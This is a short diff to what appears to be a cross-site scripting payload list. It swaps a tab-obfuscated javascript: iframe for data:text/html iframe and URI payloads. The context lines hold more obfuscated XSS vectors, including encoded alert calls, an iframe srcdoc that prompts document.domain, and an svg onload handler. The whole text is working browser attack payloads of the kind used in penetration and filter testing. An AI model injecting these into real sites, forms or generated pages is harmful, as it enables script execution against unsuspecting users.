@@ -13,7 +13,8 @@ y='a@b'//a@b%0a\u0061lert(1)</script x>
 
 xss'''><iframe srcdoc='%26it;script>;prompt`
 ${document.domain}`%26it;/script>'>
-<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+<iframe src=data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E></iframe>
+data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E
 
 
 <sVg/onLy=1 onLoaD=confirm(1)//
